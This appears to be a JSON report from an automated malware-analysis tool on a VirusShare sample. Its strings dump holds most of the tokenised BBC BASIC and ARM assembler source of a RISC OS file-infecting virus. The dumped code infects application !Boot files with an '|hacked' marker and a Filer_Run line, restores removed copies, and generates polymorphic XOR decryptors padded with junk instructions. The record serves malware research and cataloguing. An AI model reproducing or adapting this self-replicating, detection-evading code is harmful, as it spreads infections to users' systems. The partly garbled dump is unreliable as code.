{
    "docinfo": {},
    "filename": "VirusShare_35e54e11ffb103b6a3eed182f8239026",
    "filesize": 13302,
    "filetype": "data",
    "hashes": {
        "md5": "35e54e11ffb103b6a3eed182f8239026",
        "sha1": "26e2d32af028c4234e8ffb8691ac78e663550e17",
        "sha256": "2aa5f85fd30d7c7f91ad1d56cbe5c62105f8f27c793b2151657f8c991db90834"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            " BRB virus by ExStres",
            " Source code",
            "2& DO NOT DISTRIBUTE....(or run :-)",
            "<0  report$=$ + \" at line \" + ",
            ":0,report$",
            "r%=-",
            " code r%+4096",
            " inf$(100,2)",
            " inf%(100)",
            "infcnt%=-1",
            "infects%=-1",
            " code% 2048",
            "assemble",
            "5OSCLI \"Save moo &\"+STR$~code+\"+&\"+STR$~(p%-code)",
            "6OSCLI \"Save moo &\"+STR$~codebase+\"+&\"+STR$~(r%-1)",
            " b% 16384",
            "5\u0219 \"Wimp_Initialise\",200,&4B534154,getname  ,t%",
            "polls%=0",
            "\t  :",
            "countit%=0",
            "\u0215  q%",
            "\"+ countit%=4  countit%=0:checkinfects",
            "countit%+=1",
            "6&\u0219 \"Wimp_Poll\",,b%  reason%,info%",
            "@X reason%=17  reason%=18   b%!16=5  f$=getstring(b%+44):unk%=:y%=b%!40:infect",
            "T$\u0219 \"Wimp_CloseDown\",t%,&4B534154",
            "checkinfects",
            " infects%>-1 ",
            "   iij=0  infects%",
            ")    file$=inf$(iij,0)+\".\"+inf$(iij,1)",
            "    leng%=inf%(iij)",
            "%    \u0219 \"XOS_File\",5,file$  type%",
            "$    PRINT file$+\" : \"+STR$type%",
            "     type%=0 ",
            ";       OH FLIBBLE ONE OF OUR VIRUSES HAS BEEN REMOVED!",
            ".       we better rebuilt it hadn't we :))",
            "      f$=inf$(iij,0)",
            "      nmy$=inf$(iij,1)",
            "      unk%=",
            "      y%=&2000",
            "      infect",
            "\t    ",
            "N/\u0764getstring(a%):s$=\"\":\u0215 (?a%<>13)(?a%<>0)",
            "s$+=(?a%):a%+=1::=s$",
            "\u0764remdots(nm$)",
            "\u0215 nm$,\".\")>0",
            "nm$=nm$,nm$,\".\")+1)",
            "=nm$",
            "infect",
            "' y%=&2000  remdots(f$),1)=\"!\" ",
            "'   \u0219 \"XOS_File\",5,f$+\".!Boot\"  y%",
            "    y%=1 ",
            "      f%=(f$+\".!Boot\")",
            "      \u0215  #f%",
            "      t$=#f%",
            "0      IF t$=\"|hacked\" THEN CLOSE#f%:ENDPROC",
            "      ",
            "$       y%=0  f%=(f$+\".!Boot\")",
            "    y%=0  y%=1 ",
            "       unk%= ",
            ">(        nmy$=",
            "(100)+",
            "(100)+",
            "(100)",
            "        ",
            "        nmy$=getname",
            "\\-        \u0219 \"XOS_File\",5,f$+\".\"+nmy$  yv%",
            "         yv%=0",
            "      ",
            "      #f%,\"\"",
            "      BPUT#f%,\"|hacked\"",
            "      slot%=64+(36)",
            "$      slot$=(slot%+(slot%  3))",
            "9      #f%,\"WimpSlot -min \"+slot$+\"k -max \"+slot$+\"k\"",
            "+      #f%,\"Filer_Run <obey$dir>.\"+nmy$",
            "      #f%",
            "'       \"Settype \"+f$+\".!Boot Obey\"",
            "<       \"Save \"+f$+\".\"+nmy$+\" &\"+~code+\"+&\"+~(p%-code)",
            "       unk%= ",
            ".        \u0219 \"OS_File\",5,f$+\".\"+nmy$  type%",
            "         type%=1 ",
            ")           infects%<99  infects%+=1",
            "          infcnt%+=1",
            "'           infcnt%=100  infcnt%=0",
            "           inf$(infcnt%,0)=f$",
            "\"          inf$(infcnt%,1)=nmy$",
            "        ",
            "      ",
            "87      SYS \"XOS_File\",10,f$+\".\"+nmy$,&FFB,,c%,c%+r%",
            "      assemble",
            "\u0764noop",
            "nn=(10)",
            " nn<4  =0",
            " i=3  nn",
            "reg%=(10)",
            "\u020e (18) ",
            "   2 : [opt pass",
            "!              moveq reg%,reg%",
            "           ]",
            "   3 : [opt pass",
            "&              andeq reg%,reg%,reg%",
            "           ]",
            "   4 : [opt pass",
            "&              andne reg%,reg%,reg%",
            "           ]",
            "   5 : [opt pass",
            "&              andgt reg%,reg%,reg%",
            "           ]",
            "   6 : [opt pass",
            "2&              andlt reg%,reg%,reg%",
            "           ]",
            "   7 : [opt pass",
            "P&              andal reg%,reg%,reg%",
            "           ]",
            "   8 : [opt pass",
            "n$              and reg%,reg%,reg%",
            "           ]",
            "   9 : [opt pass",
            "!              movne reg%,reg%",
            "           ]",
            "  10 : [opt pass",
            "!              movgt reg%,reg%",
            "           ]",
            "  11 : [opt pass",
            "!              movlt reg%,reg%",
            "           ]",
            "  12 : [opt pass",
            "              mov reg%,reg%",
            "           ]",
            "  13 : [opt pass",
            "!              movne reg%,reg%",
            "           ]",
            "  14 : [opt pass",
            "\"!              movcc reg%,reg%",
            "           ]",
            "  15 : [opt pass",
            "@!              movcs reg%,reg%",
            "           ]",
            "  16 : [opt pass",
            "^!              movnv reg%,reg%",
            "           ]",
            "\u0764getname",
            " z$:z$=\"\"",
            " i=0  (5)+5",
            "num%=(50)+64",
            " num%>90  num%+=7",
            "z$+=(num%)",
            "=z$,10)",
            "assemble",
            "enc%=(255)",
            " pass=0  2  2",
            "P%=code",
            "PROCnoop",
            "bb=(-aa)",
            "select%=((255)  3)",
            "\u020e select% ",
            "N&      First unecryption algorithm",
            "      0 :  [opt pass",
            "                  noop",
            "l%                  adr r0,codebase",
            "                  noop",
            "                  mov r1,#0",
            "                  noop",
            "\"                  ldr r4,mooit",
            "                  noop",
            "\"                  mov r5,#enc%",
            "                  noop",
            "%              .go ldrb r3,[r0,r1]",
            "                  noop",
            "\"                  eor r3,r3,r5",
            "                  noop",
            "%                  strb r3,[r0,r1]",
            "                  noop",
            "\"                  add r1,r1,#1",
            "                  noop",
            "                  cmp r1,r4",
            "                  noop",
            "                  blt go",
            "*#              .start adr r0,str",
            "                     noop",
            ">%                     swi \"OS_CLI\"",
            "                     noop",
            "R&                     swi \"OS_Exit\"",
            "\\D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "f%              .str equd (255) ;0",
            "p%                   equd (255) ;4",
            "z%                   equd (255) ;8",
            "&                   equd (255) ;16",
            "&                   equd (255) ;20",
            "&                   equd (255) ;24",
            "&                   equd (255) ;28",
            "&                   equd (255) ;32",
            "&                   equd (255) ;36",
            "&                   equd (255) ;48",
            "&                   equd (255) ;52",
            "*              ]: i=0  (6):[opt pass",
            "\"                   equd (255)",
            "              ]::[opt pass",
            "              .mooit equd 0",
            "*              ]: i=0  (6):[opt pass",
            "\"                   equd (255)",
            "              ]::[opt pass",
            "              ]",
            "      1 :  [opt pass",
            "                  noop",
            "                  b encryp",
            "\tBD              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "\tL%              .str equd (255) ;0",
            "\tV%                   equd (255) ;4",
            "\t`%                   equd (255) ;8",
            "\tj&                   equd (255) ;16",
            "\tt&                   equd (255) ;20",
            "\t~&                   equd (255) ;24",
            "\t&                   equd (255) ;28",
            "\t&                   equd (255) ;32",
            "\t&                   equd (255) ;36",
            "\t&                   equd (255) ;48",
            "\t&                   equd (255) ;52",
            "\tD              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "              .encryp",
            "                  noop",
            "\t%                  adr r0,codebase",
            "                  noop",
            "                  mov r1,#0",
            "                  noop",
            "!                  adr r12,str",
            "                  noop",
            "\"                  ldr r4,mooit",
            "                  noop",
            "(\"                  mov r5,#enc%",
            "                  noop",
            "                  b go",
            "                  noop",
            "PD              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "              .mooit equd 0",
            "dD              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "xD              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "%              .go ldrb r3,[r0,r1]",
            "                  noop",
            "\"                  eor r3,r3,r5",
            "                  noop",
            "%                  strb r3,[r0,r1]",
            "                  noop",
            "\"                  add r1,r1,#1",
            "                  noop",
            "                  cmp r1,r4",
            "                  noop",
            "                  blt go",
            "                  noop",
            "#              .start mov r0,r12",
            "                  noop",
            "%                     swi \"OS_CLI\"",
            "                  noop",
            "\"&                     swi \"OS_Exit\"",
            ",D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "              ]",
            "      2:  [opt pass",
            "                  noop",
            "                  b encryp",
            "                  noop",
            "hD              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "              .encryp",
            "|%                  adr r0,codebase",
            "                  noop",
            "                  mov r1,#0",
            "                  noop",
            "                  b codeit",
            "D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "%              .str equd (255) ;0",
            "%                   equd (255) ;4",
            "%                   equd (255) ;8",
            "&                   equd (255) ;16",
            "&                   equd (255) ;20",
            "&                   equd (255) ;24",
            "&                   equd (255) ;28",
            "&                   equd (255) ;32",
            "&                   equd (255) ;36",
            "&                   equd (255) ;48",
            "&&                   equd (255) ;52",
            "                  noop",
            ":D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "              .mooit equd 0",
            "                  noop",
            "bD              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "v'              .ency strb r3,[r0,r1]",
            "                  noop",
            "\"                  add r1,r1,#1",
            "                  noop",
            "                  cmp r1,r4",
            "                  noop",
            "                  blt go",
            "                  noop",
            "                  b start",
            "                  noop",
            "D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "%              .codeit adr r12,str",
            "                  noop",
            "\"                  ldr r4,mooit",
            "                  noop",
            "\"                  mov r5,#enc%",
            "                  noop",
            "                  b go",
            "                  noop",
            ">D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "R%              .go ldrb r3,[r0,r1]",
            "                  noop",
            "f\"                  eor r3,r3,r5",
            "                  noop",
            "                  b ency",
            "                  noop",
            "D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "#              .start mov r0,r12",
            "                  noop",
            "%                     swi \"OS_CLI\"",
            "                  noop",
            "&                     swi \"OS_Exit\"",
            "                  noop",
            "D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "              ]",
            "      3:  [opt pass",
            "                  noop",
            "                  b encryp",
            "                  noop",
            "$D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "              .encryp",
            "                  noop",
            "L%                  adr r0,codebase",
            "                  noop",
            "                  mov r1,#0",
            "                  noop",
            "                  b codeit",
            "                  noop",
            "D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "$              .goto add r1,r1,#1",
            "                  noop",
            "                  cmp r1,r4",
            "                  noop",
            "                  b ret",
            "                  noop",
            "D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "%              .str equd (255) ;0",
            "%                   equd (255) ;4",
            "%                   equd (255) ;8",
            "&                   equd (255) ;16",
            "&                   equd (255) ;20",
            "&                   equd (255) ;24",
            "(&                   equd (255) ;28",
            "2&                   equd (255) ;32",
            "<&                   equd (255) ;36",
            "F&                   equd (255) ;48",
            "P&                   equd (255) ;52",
            "                  noop",
            "dD              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "              .mooit equd 0",
            "                  noop",
            "D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "'              .ency strb r3,[r0,r1]",
            "                  noop",
            "                  b goto",
            "                  noop",
            "              .ret blt go",
            "                  noop",
            "                  b start",
            "                  noop",
            "D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "%              .codeit adr r12,str",
            "                  noop",
            "\"                  ldr r4,mooit",
            "                  noop",
            ",\"                  mov r5,#enc%",
            "                  noop",
            "                  b go",
            "                  noop",
            "TD              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "h%              .go ldrb r3,[r0,r1]",
            "                  noop",
            "|\"                  eor r3,r3,r5",
            "                  noop",
            "                  b ency",
            "                  noop",
            "D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "#              .start mov r0,r12",
            "                  noop",
            "%                     swi \"OS_CLI\"",
            "                  noop",
            "&                     swi \"OS_Exit\"",
            "                  noop",
            "D              ]: i=0  (6):[opt pass:equd (255):]::[opt pass",
            "                  noop",
            "              ]",
            "[opt pass",
            ".codebase",
            "P%+=r%",
            "i=0  (100)",
            "[opt pass",
            "  equb (255)",
            "!mooit=r%",
            "\tp%=P%",
            "PRINT r%+1024",
            "PRINT P%-code",
            " pass=0  2  2",
            "P%=code%",
            "[opt pass",
            "    ; r0 = base",
            "    ; r1 = size",
            "    ; r2 = target",
            "    ; r4 = 0",
            "    ; r5 = enccode",
            ".go ldrb r3,[r0,r4]",
            "    eor r3,r3,r5",
            "    strb r3,[r2,r4]",
            "    add r4,r4,#1",
            "    cmp r4,r1",
            "    blt go",
            "    mov pc,r14",
            "\\-A%=c%:B%=r%:C%=codebase:E%=0:F%=enc%: go",
            "cb%=codebase",
            "ct%=codebase+r%",
            "z'cb$=~cb%:\u0215 (cb$)<8:cb$=\"0\"+cb$:",
            "'ct$=~ct%:\u0215 (ct$)<8:ct$=\"0\"+ct$:",
            "$$str=\"BASIC -quit @\"+cb$+\",\"+ct$"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.277080",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
